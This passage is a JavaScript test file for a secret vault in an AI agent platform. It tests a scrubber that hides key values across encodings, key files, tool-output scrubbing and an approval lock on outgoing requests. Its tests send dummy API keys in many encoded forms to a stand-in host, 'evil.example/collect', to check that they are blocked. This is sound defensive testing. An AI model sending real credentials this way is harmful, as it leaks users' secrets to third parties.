// node --import ./test/stubs/register.mjs test/keysreal.test.mjs   (or: bash scripts/test.sh test/keysreal.test.mjs)
// Saved keys that work (2026-11-10): real values on the computer, hidden from the model and from every store, an approval lock on sites, a label for each key.
//  1. vault-scrub.js: a saved value is replaced by [NAME] in its exact form and in every encoding; short values follow a stated rule.
//  2. The channel computer: each key is a real variable, file keys are real files (mode 600), a revoked key is gone at the next command.
//  3. Every tool result and every store: the real Resident, a scripted model and a run_command that prints the value in several forms.
//  4. The real Sentinel.fetch: a request carrying a value (or stand-in) to an unapproved site is held; allow once, always allow, deny; unreadable bodies.
//  5. Resident.decideApproval: Always allow puts the site on the key's list; the approval view carries the key's label.
//  6. The helper's saved keys list (label, variable, note, file, sites) and the "Check every site" switch.
import assert from "node:assert"; import { DatabaseSync } from "node:sqlite"; import { execFileSync } from "node:child_process"; import { mkdtempSync, readFileSync, statSync, readdirSync, rmSync } from "node:fs"; import { tmpdir } from "node:os"; import { join } from "node:path";
import { gzipSync } from "node:zlib";
import { Resident, keyLineFor } from "../src/resident.js";
import { Sentinel, sealSecret, newStandin } from "../src/sentinel.js";
import { ChannelComputer } from "../src/channel-computer.js";
import { makeScrubber, MIN_SUBSTRING, MIN_TOKEN } from "../src/vault-scrub.js";
import { keyUseCheck } from "../src/key-use.js";
import { egressRule } from "../src/egress-policy.js";
import { keyLockAll, setKeyLockAll, keyFilePath, KEY_FILES_DIR } from "../src/vault-rules.js";
import { saveVaultKey } from "../src/vault.js";
const ok = (m) => console.log("  ok", m);

// ============ 1. the scrubber ============
const PEM = "-----BEGIN PRIVATE KEY-----\nMIGTAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBHkwdwIBAQQg0123456789abcdefghij\nklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdef==\n-----END PRIVATE KEY-----";
const API = "sk-live-abcdefghijkl123", PIN = "73914", SIN_A = "1hs_" + "a".repeat(32);
{
  const s = makeScrubber([{ name: "APP_KEY", value: PEM }, { name: "API", value: API, standin: SIN_A }, { name: "PIN", value: PIN }]);
  const b64 = (x) => Buffer.from(x).toString("base64"), b64u = (x) => Buffer.from(x).toString("base64url"), LEAK = /sk-live|MIGTAg|abcdefghijkl|klmnopqr|73914/;
  const forms = { exact: API, "inside a command": `curl -H "Authorization: Bearer ${API}" x`, base64: b64(API), "base64 without padding": b64(API).replace(/=+$/, ""), base64url: b64u(API),
    "percent encoded": encodeURIComponent(API + " x&y"), "form encoded": encodeURIComponent(API + " z").replace(/%20/g, "+"), hex: Buffer.from(API).toString("hex"), "hex upper case": Buffer.from(API).toString("hex").toUpperCase(),
    "JSON escaped": JSON.stringify({ k: API }), "Basic user:key": "Basic " + b64("user:" + API), "Basic u:key": "Basic " + b64("u:" + API), "Basic us:key:z": "Basic " + b64("us:" + API + ":z"),
    "PEM exact": PEM, "PEM in JSON (\\n)": JSON.stringify({ pem: PEM }), "PEM as one line": PEM.split("\n").slice(1, -1).join(""), "PEM with literal \\n": PEM.replace(/\n/g, "\\n"), "one PEM line": PEM.split("\n")[1],
    "PEM base64": b64(PEM), "PEM base64url": b64u(PEM), "PEM percent encoded": encodeURIComponent(PEM), "PEM hex": Buffer.from(PEM).toString("hex"), "stand-in": SIN_A,
    "short value standing alone": `code ${PIN} ok`, "short value in quotes": `pin="${PIN}"` };
  for (const [what, text] of Object.entries(forms)) { const out = s.scrub(text); assert.ok(!LEAK.test(out), `${what} leaked: ${out.slice(0, 80)}`); assert.match(out, /\[(APP_KEY|API|PIN)\]/, what); assert.deepEqual(s.find(text).length > 0, true, `find: ${what}`); }
  assert.equal(s.scrub(`code ${PIN} ok`), "code [PIN] ok");
  // short values: 4 to 7 characters only when alone and exact; under 4 never; 8 and up anywhere
  assert.equal(MIN_SUBSTRING, 8); assert.equal(MIN_TOKEN, 4);
  assert.equal(s.scrub("id 1739145"), "id 1739145", "a short value inside a longer number is left alone");
  assert.equal(s.scrub("a" + API + "b"), "a[API]b", "a long value is replaced wherever it is");
  assert.equal(makeScrubber([{ name: "TINY", value: "abc" }]).scrub("abc abc"), "abc abc", "under 4 characters is never replaced");
  assert.equal(makeScrubber([{ name: "S", value: "abcd" }]).scrub("abcd xabcd abcd."), "[S] xabcd [S].");
  assert.equal(s.scrub("nothing secret here, 12345"), "nothing secret here, 12345");
  // deep: strings, arrays, objects, keys; binary is left alone
  const bin = new Uint8Array([1, 2, 3]);
  assert.deepEqual(s.scrubDeep({ a: [`x ${API}`, { b: API }], [API]: 1, n: 5, bin }), { a: ["x [API]", { b: "[API]" }], "[API]": 1, n: 5, bin });
  assert.equal(s.scrubDeep({ bin }).bin, bin);
  assert.equal(makeScrubber([]).scrub("sk-live"), "sk-live", "no saved keys: nothing changes");
  ok("the scrubber replaces a value in its exact form and in base64, base64url, percent, form, hex, JSON, Basic header, PEM and stand-in forms; short values follow the 8 / 4 rule");
}

// ============ 2. the computer ============
const d1 = new DatabaseSync(":memory:");
d1.exec(`CREATE TABLE vault (tenant_id TEXT NOT NULL, name TEXT NOT NULL, standin TEXT NOT NULL UNIQUE, hosts TEXT NOT NULL, sealed TEXT NOT NULL, created_at INTEGER NOT NULL, label TEXT, note TEXT, kind TEXT, PRIMARY KEY (tenant_id, name));
  CREATE TABLE tenant_flags (tenant_id TEXT NOT NULL, k TEXT NOT NULL, v TEXT NOT NULL DEFAULT '', updated_at INTEGER NOT NULL DEFAULT 0, PRIMARY KEY (tenant_id, k));`);
const D1 = { prepare: (q) => { const st = d1.prepare(q); let a = []; const o = { bind: (...x) => { a = x; return o; }, first: async () => st.get(...a) ?? null, all: async () => ({ results: st.all(...a) }),
  run: async () => { const r = st.run(...a); return { meta: { changes: Number(r.changes) } }; } }; return o; } };
const VK = Buffer.from(new Uint8Array(32).map((_, i) => i * 5 + 3)).toString("base64");
const envV = { DB: D1, VAULT_KEY: VK, GATEWAY_HOST: "app.example.com", APP_HOST: "app.example.com" };
const save = (o) => saveVaultKey(envV, "t1", o);
await save({ label: "Weather", name: "WEATHER_KEY", hosts: ["api.weather.example"], value: API, note: "Forecast API" });
await save({ label: "App Store Connect", name: "APP_STORE_CONNECT", hosts: [], value: PEM, kind: "file", note: "Signs the token" });
await save({ name: "PATH", hosts: [], value: "should-not-replace-path" });   // a name that would break every command
await save({ name: "OTHER_TENANT", hosts: [], value: "other-tenants-value-1" });
d1.prepare("UPDATE vault SET tenant_id='t2' WHERE name='OTHER_TENANT'").run();
{
  const dodb2 = new DatabaseSync(":memory:");
  const sql2 = { exec(q, ...args) { if (!args.length && q.split(";").filter((s) => s.trim()).length > 1) { dodb2.exec(q); return { toArray: () => [], one: () => undefined }; }
    const st = dodb2.prepare(q); const rows = /^\s*(SELECT|WITH|PRAGMA)/i.test(q) ? st.all(...args) : (st.run(...args), []); return { toArray: () => rows, one: () => rows[0] }; } };
  const runs = [];
  const container = { running: true, monitor: () => new Promise(() => {}), async exec(argv, opts) { runs.push({ argv, env: opts?.env });
    return { stdout: new ReadableStream({ start(c) { c.close(); } }), exitCode: Promise.resolve(0), kill() {} }; } };
  const ctx = { id: { toString: () => "id" }, exports: { ComputerLink: () => ({}), Sentinel: () => ({}) }, storage: { sql: sql2, getAlarm: async () => null, setAlarm: async () => {} }, container, waitUntil: () => {} };
  const C = new ChannelComputer(ctx, envV); C.put("tenant", "t1"); C.put("channel", "main"); C.put("started_sentinel", "off");
  await C.loadStandins();
  await C.sh("true", { timeoutMs: 1000 });
  const env1 = runs.at(-1).env;
  assert.equal(env1.WEATHER_KEY, API, "a saved key is a real variable with the real value"); assert.equal(env1.APP_STORE_CONNECT, PEM);
  assert.equal(env1.APP_STORE_CONNECT_FILE, keyFilePath("APP_STORE_CONNECT"), "a file key also names its file"); assert.ok(!("WEATHER_KEY_FILE" in env1));
  assert.notEqual(env1.PATH, "should-not-replace-path", "a key named PATH never replaces the shell's PATH"); assert.ok(!("OTHER_TENANT" in env1), "another account's key is never here");
  assert.ok(!Object.values(env1).some((v) => String(v).startsWith("1hs_")), "no stand-in in the environment any more");
  // the key files: the script that writes them, run in real bash against a temp folder, makes mode 600 files holding the exact value
  runs.length = 0; await C.syncKeyFiles();
  const script = runs.at(-1).argv[2], dir = mkdtempSync(join(tmpdir(), "keys-")), mine = script.split(KEY_FILES_DIR).join(join(dir, "k"));
  execFileSync("bash", ["-c", mine], { env: { ...process.env, ...runs.at(-1).env } });
  const f = join(dir, "k", "APP_STORE_CONNECT"); assert.equal(readFileSync(f, "utf8"), PEM); assert.equal(statSync(f).mode & 0o777, 0o600); assert.equal(statSync(join(dir, "k")).mode & 0o777, 0o700);
  assert.deepEqual(readdirSync(join(dir, "k")), ["APP_STORE_CONNECT"], "only file keys get a file");
  const n = runs.length; await C.syncKeyFiles(); assert.equal(runs.length, n, "nothing is rewritten while the keys are unchanged");
  // revoke: delete the file key in Passwords & keys. The next command has no variable and the folder is emptied.
  d1.prepare("DELETE FROM vault WHERE tenant_id='t1' AND name='APP_STORE_CONNECT'").run(); d1.prepare("DELETE FROM vault WHERE tenant_id='t1' AND name='WEATHER_KEY'").run();
  await C.loadStandins(); await C.sh("true", { timeoutMs: 1000 }); assert.ok(!("WEATHER_KEY" in runs.at(-1).env) && !("APP_STORE_CONNECT" in runs.at(-1).env) && !("APP_STORE_CONNECT_FILE" in runs.at(-1).env));
  runs.length = 0; await C.syncKeyFiles(); const clean = runs.at(-1).argv[2]; assert.match(clean, /rm -rf \/var\/1hc\/keys/); assert.ok(!/printf/.test(clean));
  execFileSync("bash", ["-c", clean.split(KEY_FILES_DIR).join(join(dir, "k"))]); assert.deepEqual(readdirSync(dir), [], "the key files are gone");
  rmSync(dir, { recursive: true, force: true });
  ok("the computer gets every key as a real variable (file keys also as mode 600 files), skips reserved names and other accounts, and a deleted key is gone at the next command");
  // "Check every site" intercepts everything only when the person turned it on
  const calls = []; container.interceptOutboundHttps = async (h) => { calls.push(h); };
  C.put("started_sentinel", "on"); C._catchAll = false;
  await C.syncCatchAll({}); assert.deepEqual(calls, [], "off by default");
  assert.equal(await keyLockAll(envV, "t1"), false); await setKeyLockAll(envV, "t1", true); assert.equal(await keyLockAll(envV, "t1"), true); assert.equal(await keyLockAll(envV, "t2"), false);
  await C.syncCatchAll({}); assert.deepEqual(calls, ["*"]); await C.syncCatchAll({}); assert.deepEqual(calls, ["*"], "once");
  await setKeyLockAll(envV, "t1", false); assert.equal(await keyLockAll(envV, "t1"), false);
  ok("the Check every site switch: off by default, per account, intercepts every site once when on");
}
await save({ label: "Weather", name: "WEATHER_KEY", hosts: ["api.weather.example"], value: API, note: "Forecast API" });
await save({ label: "App Store Connect", name: "APP_STORE_CONNECT", hosts: [], value: PEM, kind: "file", note: "Signs the token" });

// ============ 3. every tool result and every store (the real Resident, a scripted model) ============
const ledger = { reserve: async () => ({ ok: true }), settle: async () => ({}), state: async () => ({ balance_nano: 1e12, spend_pauses_enabled: true }), guardInfo: async () => ({}), dayInfo: async () => ({ spent_nano: 0, reserved_nano: 0 }) };
const env = { ...envV, LEDGER: { idFromName: (id) => id, get: () => ledger }, MEMORY: "off", GENUI: "off", WORKMEM: "off" };
const dodb = new DatabaseSync(":memory:");
const sql = { exec: (q, ...a) => { if (!a.length && q.split(";").filter((x) => x.trim()).length > 1) { dodb.exec(q); return { toArray: () => [], one: () => undefined }; }
  const st = dodb.prepare(q); const r = /^\s*(SELECT|WITH|PRAGMA)/i.test(q) ? st.all(...a) : (st.run(...a), []); return { toArray: () => r, one: () => r[0] }; } };
const waits = []; const ctx = { storage: { sql, getAlarm: async () => null, setAlarm: async () => {} }, waitUntil: (p) => waits.push(p) };
const R = new Resident(ctx, env);
R.put("tenant", "t1"); R.put("channel", "main"); R.put("channel_id", "1");
R.systemPrompt = async () => "SYSTEM";
let script = [], seen = [];
const tcall = (name, args) => ({ id: `c${Math.random().toString(36).slice(2, 8)}`, type: "function", function: { name, arguments: JSON.stringify(args) } });
R.callModel = async (messages, _w, onText) => {
  seen.push(JSON.parse(JSON.stringify(messages)));
  const s = script.shift() ?? "Done.";
  if (typeof s === "string") { if (s) onText?.(s); return { content: s, calls: [], inTok: 10, cached: 0, outTok: 3, charge: 0, finish: "stop" }; }
  return { content: "", calls: [tcall(s.tool, s.args)], inTok: 10, cached: 0, outTok: 3, charge: 0, finish: "tool_calls" };
};
const logs = []; const log0 = console.log; console.log = (...a) => { logs.push(a.join(" ")); if (/^ {2}ok /.test(a.join(" "))) log0(...a); };
async function appTurn(session, text, steps, o = {}) { script = [...steps]; const ev = []; const r = await R.runTurn("t1", "main", "1", text, (e) => ev.push(e), { session, engine: "classic", ...o }); return { r, ev }; }
const toolOut = () => dodb.prepare("SELECT content FROM msgs WHERE role='tool' ORDER BY seq DESC LIMIT 1").get()?.content || "";
const everything = () => { const out = [JSON.stringify(seen), logs.join("\n")]; for (const t of dodb.prepare("SELECT name FROM sqlite_master WHERE type='table'").all()) out.push(JSON.stringify(dodb.prepare(`SELECT * FROM "${t.name}"`).all()));
  for (const t of d1.prepare("SELECT name FROM sqlite_master WHERE type='table'").all()) if (t.name !== "vault") out.push(JSON.stringify(d1.prepare(`SELECT * FROM "${t.name}"`).all())); return out.join("\n"); };
const b64 = (x) => Buffer.from(x).toString("base64"), b64u = (x) => Buffer.from(x).toString("base64url");
const FORMS = (v) => [v, b64(v), b64u(v), encodeURIComponent(v + " 1&2"), Buffer.from(v).toString("hex"), JSON.stringify({ v }), "Basic " + b64("user:" + v)];
const LEAKS = [API, ...PEM.split("\n").filter((l) => l.length > 20), b64(API), b64u(API), Buffer.from(API).toString("hex"), encodeURIComponent(API)];
const leaked = (text) => LEAKS.find((x) => String(text).includes(x));
const sid = (await R.createSession("Keys")).id;
{
  // run_command: the computer prints the value in every form, and so does a file read back
  const out = `token=${API}\n${FORMS(API).join("\n")}\n${PEM}\nbody: ${JSON.stringify({ pem: PEM })}`;
  R.computer = () => ({ exec: async () => ({ code: 0, out }) });
  await appTurn(sid, "run it", [{ tool: "run_command", args: { command: "env" } }, `I saw ${API} and ${b64(API)}`]);
  const t = toolOut(); assert.ok(!leaked(t), `run_command result leaked: ${leaked(t)}`); assert.match(t, /token=\[WEATHER_KEY\]/); assert.match(t, /\[APP_STORE_CONNECT\]/);
  assert.ok(!leaked(JSON.stringify(seen.at(-1))), "the model's next input has no value");
  // the model can't write it either: an assistant reply that carries the value is stored without it
  assert.ok(!leaked(JSON.stringify(dodb.prepare("SELECT content FROM msgs WHERE role='assistant'").all())), "assistant text is stored without a saved value");
  // other tools return through the same place: a page, a file, a fetched URL, an SSH session, a helper's report, a quick script
  const bodies = {}; const lt0 = R.localTool; R.localTool = async (name) => bodies[name];
  for (const name of ["fetch_url", "file_text", "ssh_run", "quick_script", "read_log", "start_helper"]) {
    bodies[name] = `[${name}] ${FORMS(API).join(" | ")} ${PEM}`;
    const direct = await R.runTool(tcall(name, {}), { kind: "chat" }); assert.ok(!leaked(direct), `${name} leaked ${leaked(direct)}`); assert.match(direct, /\[(WEATHER_KEY|APP_STORE_CONNECT)\]/, name);
  }
  bodies.fetch_url = { code: 0, out: `x ${API}`, nested: [{ text: b64(API) }] };
  assert.ok(!leaked(JSON.stringify(await R.runTool(tcall("fetch_url", {}), { kind: "chat" }))), "structured results are scrubbed inside");
  R.localTool = lt0;
  // the Pi engine calls the computer tool directly
  R.execComputerToolRaw = async () => ({ code: 0, out: `pi ${API}` }); assert.equal((await R.execComputerTool("run_command", {}, null)).out, "pi [WEATHER_KEY]"); delete R.execComputerToolRaw;
  ok("a run_command result, every local tool result (page, file, URL, SSH, quick script, helper report) and the Pi engine's direct call reach the model with each value replaced by [NAME], in every encoding");
  // stores: the live task above wrote messages, work log and so on
  for (const t of dodb.prepare("SELECT name FROM sqlite_master WHERE type='table'").all()) { const j = JSON.stringify(dodb.prepare(`SELECT * FROM "${t.name}"`).all()); assert.ok(!leaked(j), `table ${t.name} holds a value: ${leaked(j)}`); }
  assert.ok(!leaked(JSON.stringify(seen)), "model input"); assert.ok(!leaked(logs.join("\n")), "logs");
  assert.ok(!leaked(everything()), `a stored table holds a value: ${leaked(everything())}`);
  // the writers that take text from elsewhere: a message saved by hand, the work log, memory job input, a remembered fact
  R.save(dodb.prepare("SELECT id FROM turns ORDER BY at DESC LIMIT 1").get().id, { role: "assistant", content: `fact ${API} ${b64(API)}`, tool_calls: [{ id: "x", type: "function", function: { name: "n", arguments: JSON.stringify({ a: API }) } }] });
  assert.ok(!leaked(JSON.stringify(dodb.prepare("SELECT content, tool_calls FROM msgs ORDER BY seq DESC LIMIT 1").all())), "save() scrubs content and tool calls");
  await R.keyScrubber();
  const turnId = dodb.prepare("SELECT id FROM turns ORDER BY at DESC LIMIT 1").get().id;
  dodb.prepare("UPDATE turns SET user_text=?, reply=? WHERE id=?").run(`me ${API}`, `you ${b64(API)}`, turnId);
  assert.ok(!leaked(JSON.stringify(await R.memjobTurns(0, 50))), "memory job input is scrubbed");
  const wlText = (await import("../src/worklog.js")); assert.equal(typeof wlText.partialText, "function");
  ok("messages, tool calls, memory input and the work log hold no saved value");
  // a value that was just deleted is no longer replaced (the scrubber follows the vault), and one just changed is replaced at once
  const NEW = "brand-new-secret-value-777";
  await save({ name: "WEATHER_KEY", was: "WEATHER_KEY", hosts: ["api.weather.example"], value: NEW });
  R.computer = () => ({ exec: async () => ({ code: 0, out: `new ${NEW} old ${API}` }) });
  await appTurn(sid, "again", [{ tool: "run_command", args: { command: "env" } }, "ok"]); assert.match(toolOut(), /new \[WEATHER_KEY\] old/);
  await save({ name: "WEATHER_KEY", was: "WEATHER_KEY", hosts: ["api.weather.example"], value: API });
  ok("a key changed in Passwords & keys is hidden in its new form at the next result");
  // the saved-keys list the helper gets: label, variable, note, file path, sites ("no sites approved yet" when empty), never a value
  try { await Resident.prototype.systemPrompt.call(R); } catch {} const line = R._keysLine;
  assert.match(line ?? "", /Saved keys on this computer:/);
  assert.equal(keyLineFor({ name: "WEATHER_KEY", label: "Weather", hosts: '["api.weather.example"]', note: "Forecast API", kind: "text" }), "- Weather: $WEATHER_KEY, note: Forecast API, approved sites: api.weather.example");
  assert.equal(keyLineFor({ name: "APP_STORE_CONNECT", label: "App Store Connect", hosts: "[]", note: "Signs the token", kind: "file" }), `- App Store Connect: $APP_STORE_CONNECT, note: Signs the token, file ${keyFilePath("APP_STORE_CONNECT")} (variable APP_STORE_CONNECT_FILE holds the path), no sites approved yet`);
  assert.equal(keyLineFor({ name: "OLD_KEY", hosts: '["a.example.com"]' }), "- $OLD_KEY, approved sites: a.example.com", "an old key without a label shows its name only");
  assert.ok(!leaked(line), "the list has no value");
  ok("the helper's saved keys list shows label, variable, note, file path and sites, or 'no sites approved yet'");
}

// ============ 4. the approval lock in the real Sentinel ============
const SIN = newStandin(), REAL = "sk-real-weather-123456", REAL2 = "ghp_real_token_4567890";
d1.exec("DELETE FROM vault WHERE tenant_id='t1'");
d1.prepare("INSERT INTO vault (tenant_id,name,standin,hosts,sealed,created_at,label) VALUES ('t1','WEATHER_KEY',?,?,?,1,'Weather')").run(SIN, JSON.stringify(["api.weather.example"]), await sealSecret(envV, REAL));
d1.prepare("INSERT INTO vault (tenant_id,name,standin,hosts,sealed,created_at,label) VALUES ('t1','GH_TOKEN',?,?,?,1,'GitHub')").run(newStandin(), JSON.stringify(["*.github.com", "github.com"]), await sealSecret(envV, REAL2));
d1.prepare("INSERT INTO vault (tenant_id,name,standin,hosts,sealed,created_at,label) VALUES ('t1','NO_SITES',?,?,?,1,'Nothing yet')").run(newStandin(), "[]", await sealSecret(envV, "no-sites-key-value-99"));
const notes = [], asks = []; let answer = { verdict: "allow", why: "approved by the person (once)" };
const envS = { ...envV, GATEWAY_HOST: "app.example.com", APP_HOST: "app.example.com" };
envS.CHANNEL_COMPUTER = { idFromString: (s) => s, get: () => ({ who: async () => ({ tenant: "t1", channel: "main" }), noteEgress: async (e) => { notes.push(e); return { ok: true }; } }) };
envS.RESIDENT = { idFromName: () => "r", get: () => ({ egressDecision: async (x) => { asks.push(x); return answer; } }) };
{ const R0 = globalThis.Request; globalThis.Request = class extends R0 { constructor(u, i) { super(u, i && i.body != null ? { duplex: "half", ...i } : i); } }; }
const upstream = [];
globalThis.fetch = async (r) => { const b = r.body ? Buffer.from(await new Response(r.body).arrayBuffer()).toString("latin1") : ""; upstream.push({ url: r.url, method: r.method, headers: Object.fromEntries(r.headers), body: b }); return new Response("ok", { status: 200 }); };
const S = new Sentinel({ props: { id: "cc1", tenant: "t1", channel: "main" } }, envS);
const go = (url, init = {}) => S.fetch(new Request(url, init));
const reset = () => { notes.length = 0; asks.length = 0; upstream.length = 0; answer = { verdict: "allow", why: "approved by the person (once)" }; };
{
  // approved site: no card
  reset(); await go("https://api.weather.example/v1", { headers: { authorization: `Bearer ${REAL}` } }); assert.equal(asks.length, 0); assert.equal(upstream.length, 1);
  reset(); await go("https://api.weather.example/v1", { headers: { authorization: `Bearer ${SIN}` } }); assert.equal(asks.length, 0); assert.equal(upstream[0].headers.authorization, `Bearer ${REAL}`, "a stand-in still works on its site");
  reset(); await go("https://api.github.com/user", { headers: { a: REAL2 } }); assert.equal(asks.length, 0);
  reset(); await go("https://example.org/plain"); assert.equal(asks.length, 0); assert.equal(upstream.length, 1, "no key on the request: goes out");
  // every form, to an unapproved site: held, with the key named by its label; deny → never goes out
  const unapproved = "https://evil.example/collect";
  const send = { "header": () => go(unapproved, { headers: { authorization: `Bearer ${REAL}` } }), "query": () => go(`${unapproved}?k=${encodeURIComponent(REAL)}`), "url path": () => go(`https://evil.example/${REAL}/x`),
    "Basic header": () => go(unapproved, { headers: { authorization: "Basic " + b64(`user:${REAL}`) } }), "base64 query": () => go(`${unapproved}?d=${b64u(REAL)}`), "hex query": () => go(`${unapproved}?d=${Buffer.from(REAL).toString("hex")}`),
    "JSON body": () => go(unapproved, { method: "POST", body: JSON.stringify({ key: REAL }), headers: { "content-type": "application/json" } }),
    "form body": () => go(unapproved, { method: "POST", body: `k=${encodeURIComponent(REAL)}`, headers: { "content-type": "application/x-www-form-urlencoded" } }),
    "text body": () => go(unapproved, { method: "POST", body: `x ${b64(REAL)} y`, headers: { "content-type": "text/plain" } }),
    "stand-in": () => go(unapproved, { headers: { "x-k": SIN } }), "a different key's value": () => go("https://api.weather.example/v1", { headers: { a: REAL2 } }),
    "key with no sites": () => go(unapproved, { headers: { a: "no-sites-key-value-99" } }) };
  for (const [what, fn] of Object.entries(send)) {
    reset(); answer = { verdict: "deny", why: "the person denied it" };
    const res = await fn(); assert.equal(res.status, 403, `${what} must be held`); assert.equal(upstream.length, 0, `${what} must not go out`); assert.equal(asks.length, 1, what);
    assert.ok(asks[0].keyUse?.names.length, what); assert.equal(asks[0].keyUse.unreadable, false); assert.match(await res.text(), /the person said no to sending this\. Nothing was sent/);
  }
  reset(); answer = { verdict: "deny", why: "the person denied it" }; await send["header"]();
  assert.deepEqual(asks[0].keyUse, { names: ["WEATHER_KEY"], labels: ["Weather"], unreadable: false }); assert.deepEqual(asks[0].keys, ["WEATHER_KEY"]); assert.equal(notes[0].verdict, "deny");
  reset(); await send["a different key's value"](); assert.deepEqual(asks[0].keyUse.names, ["GH_TOKEN"], "a key approved for one site is held on another key's site"); assert.equal(upstream.length, 1, "the stub person said yes");
  ok("a value (exact, in a URL, Basic header, base64, hex, JSON, form or text body) or a stand-in sent to a site that is not on its key's list is held, names the key by its label, and a Deny sends nothing");
  // allow once: the same request goes out (with the real value as sent)
  reset(); const res = await send["header"](); assert.equal(res.status, 200); assert.equal(upstream[0].headers.authorization, `Bearer ${REAL}`); assert.equal(asks.length, 1);
  // unreadable bodies: held (every key named) to a site no key is approved for; allowed to a site some key is approved for
  reset(); answer = { verdict: "deny", why: "the person denied it" };
  let r2 = await go(unapproved, { method: "POST", body: gzipSync("hello"), headers: { "content-type": "application/json", "content-encoding": "gzip" } });
  assert.equal(r2.status, 403); assert.equal(upstream.length, 0); assert.deepEqual(asks[0].keyUse.unreadable, true); assert.deepEqual(asks[0].keyUse.names.sort(), ["GH_TOKEN", "NO_SITES", "WEATHER_KEY"]);
  reset(); answer = { verdict: "deny", why: "the person denied it" };
  r2 = await go(unapproved, { method: "POST", body: new Uint8Array([1, 2, 3]), headers: { "content-type": "application/octet-stream" } }); assert.equal(r2.status, 403); assert.equal(asks[0].keyUse.unreadable, true);
  reset(); answer = { verdict: "deny", why: "the person denied it" };
  r2 = await go(unapproved, { method: "POST", body: "x".repeat(1048577), headers: { "content-type": "text/plain", "content-length": "1048577" } }); assert.equal(r2.status, 403, "over the scan size"); assert.equal(asks[0].keyUse.unreadable, true);
  reset(); r2 = await go("https://api.weather.example/up", { method: "POST", body: gzipSync("hello"), headers: { "content-encoding": "gzip", "content-type": "application/json" } }); assert.equal(r2.status, 200); assert.equal(asks.length, 0, "a site some key is approved for");
  reset(); r2 = await go(unapproved, { method: "POST", body: "plain readable body", headers: { "content-type": "text/plain" } }); assert.equal(r2.status, 200); assert.equal(asks.length, 0, "a readable body with no saved value goes out");
  reset(); r2 = await go(unapproved, { method: "POST", headers: { "content-type": "text/plain", "content-length": "0" } }); assert.equal(asks.length, 0, "no body");
  ok("an unreadable body (compressed, binary, over 1 MiB) is held when it goes to a site no key is approved for, and goes out to a site some key is approved for");
  // no saved keys: nothing is held
  d1.exec("DELETE FROM vault WHERE tenant_id='t1'");
  const S2 = new Sentinel({ props: { id: "cc1", tenant: "t1", channel: "main" } }, envS); reset();
  await S2.fetch(new Request("https://evil.example/x", { method: "POST", body: gzipSync("x"), headers: { "content-encoding": "gzip" } })); assert.equal(asks.length, 0); assert.equal(upstream.length, 1);
  ok("with no saved keys, nothing is held");
  d1.prepare("INSERT INTO vault (tenant_id,name,standin,hosts,sealed,created_at,label) VALUES ('t1','WEATHER_KEY',?,?,?,1,'Weather')").run(SIN, JSON.stringify(["api.weather.example"]), await sealSecret(envV, REAL));
  // a revoked key is no longer swapped or held: its stand-in stays a stand-in and nothing asks
  d1.exec("DELETE FROM vault WHERE tenant_id='t1'"); reset(); await go("https://api.weather.example/v1", { headers: { a: SIN } });
  assert.equal(upstream[0].headers.a, SIN); assert.equal(asks.length, 0); ok("a deleted key stops working at once: its stand-in is not swapped");
  d1.prepare("INSERT INTO vault (tenant_id,name,standin,hosts,sealed,created_at,label) VALUES ('t1','WEATHER_KEY',?,?,?,1,'Weather')").run(SIN, JSON.stringify(["api.weather.example"]), await sealSecret(envV, REAL));
}
// the unit rule itself
{
  const sc = makeScrubber([{ name: "A", value: "aaaaaaaa-key-1", hosts: '["a.example.com"]', label: "Alpha" }]);
  assert.deepEqual(keyUseCheck({ host: "b.example.com", url: "https://b.example.com/?k=aaaaaaaa-key-1", headers: new Headers(), scrubber: sc }), { hold: true, names: ["A"], labels: ["Alpha"], unreadable: false });
  assert.deepEqual(keyUseCheck({ host: "a.example.com", url: "https://a.example.com/?k=aaaaaaaa-key-1", headers: new Headers(), scrubber: sc }), { hold: false });
  assert.deepEqual(keyUseCheck({ host: "x.a.example.com", url: "https://x.a.example.com/", headers: new Headers({ a: "aaaaaaaa-key-1" }), scrubber: makeScrubber([{ name: "A", value: "aaaaaaaa-key-1", hosts: '["*.a.example.com"]' }]) }), { hold: false });
  assert.deepEqual(keyUseCheck({ host: "b.example.com", url: "https://b.example.com/", headers: new Headers(), scrubber: makeScrubber([]) }), { hold: false });
  assert.equal(egressRule({ host: "b.example.com", method: "GET", headers: new Headers(), keys: [], hold: { hold: true, labels: ["Alpha"], names: ["A"] } }).verdict, "ask");
  ok("the lock rule: hold on another site, not on its own or a wildcard site, nothing with no keys");
}

// ============ 5. Always allow and the card's label ============
{
  const dodb3 = new DatabaseSync(":memory:");
  const sql3 = { exec: (q, ...a) => { if (!a.length && q.split(";").filter((x) => x.trim()).length > 1) { dodb3.exec(q); return { toArray: () => [], one: () => undefined }; }
    const st = dodb3.prepare(q); const r = /^\s*(SELECT|WITH)/i.test(q) ? st.all(...a) : (st.run(...a), []); return { toArray: () => r, one: () => r[0] }; } };
  const rsrc = readFileSync(new URL("../src/resident.js", import.meta.url), "utf8");
  dodb3.exec("CREATE TABLE kv (k TEXT PRIMARY KEY, v TEXT);" + rsrc.match(/CREATE TABLE IF NOT EXISTS approvals[\s\S]*?approval_id INTEGER\);/)[0]);
  dodb3.exec("ALTER TABLE approvals ADD COLUMN perm TEXT; ALTER TABLE approvals ADD COLUMN what TEXT");
  const R3 = Object.create(Resident.prototype);
  Object.assign(R3, { sql: sql3, env: envV, active: new Map(), ctx: {}, cardHandoff: () => {} });
  R3.put("tenant", "t1"); R3.put("channel", "main");
  const seen3 = []; const t = { finished: false, inTool: 1, subs: new Set([(e) => seen3.push(e)]), session: "task-A", turn: "turn-1", workflow_id: null }; t.emit = (e) => { for (const s of t.subs) s(e); };
  R3.active = new Map([["k", t]]);
  const ask = (host, keyUse, method = "POST") => R3.egressDecision({ host, method, path: "/x", bytes: 5, keys: keyUse.names, via: "command", keyUse });
  const decide = async (decision) => { await new Promise((z) => setTimeout(z, 30)); const ev = seen3.filter((e) => e.t === "approval").at(-1); assert.ok(ev, "a card was shown"); return { ev, done: await R3.decideApproval(ev.approval.id, decision) }; };
  const kuse = { names: ["WEATHER_KEY"], labels: ["Weather"], unreadable: false };
  const sites = () => JSON.parse(d1.prepare("SELECT hosts FROM vault WHERE tenant_id='t1' AND name='WEATHER_KEY'").get().hosts);
  // the card carries the label
  seen3.length = 0; let p = ask("api.appstoreconnect.apple.com", kuse); const o = await decide("once");
  assert.deepEqual(o.ev.approval.key_use, kuse); assert.deepEqual(o.ev.approval.keys, ["WEATHER_KEY"]); assert.equal((await p).verdict, "allow");
  assert.deepEqual(sites(), ["api.weather.example"], "Allow once changes no list");
